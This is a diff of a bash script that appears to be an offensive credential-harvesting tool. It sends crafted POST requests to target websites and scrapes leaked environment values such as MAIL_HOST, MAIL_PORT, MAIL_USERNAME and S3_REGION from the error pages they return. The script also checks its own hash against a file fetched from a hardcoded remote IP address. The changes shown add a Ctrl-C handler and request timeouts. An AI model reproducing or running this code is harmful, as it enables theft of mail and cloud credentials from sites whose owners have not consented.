@@ -13,6 +13,16 @@ LK='\e[43m'
 CX=`cat $0 | sha256sum`
 CZ=`curl "http://103.146.202.117/cdg.txt" -s | sha256sum`
 
+trap ctrl_c INT
+function ctrl_c() {
+    echo ""
+    echo "Ctrl-C by $USER"
+    echo "Bersihkan layar tunggu sebentar."
+    sleep 3
+    clear
+    exit
+}
+
 echo ""
 cat <<COUP
 ,---,---,---,---,---,---,---,---,---,---,---,---,---,-------,
@@ -96,7 +106,7 @@ REGIONPAS3=$(echo "$ambilenv" | grep -Po 'S3_REGION=\K[^ ]+')
         fi
 }
 MethodAws2(){
-env=$(curl -skL --request POST "${TARGET}" -o km.htm -A "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0." -H "Upgrade-Insecure-Requests" -d "h4xor=c0up" -o km.htm)
+env=$(curl -skL --silent --max-time 10 --connect-timeout 10 --request POST "${TARGET}" -o km.htm -A "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0." -H "Upgrade-Insecure-Requests" -d "h4xor=c0up" -o km.htm)
 TH=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<pre' | grep "<td \|MAIL_HOST" > k.htm)
 TP=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_PORT" > kc.htm)
 TU=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_USERNAME" > kd.htm)
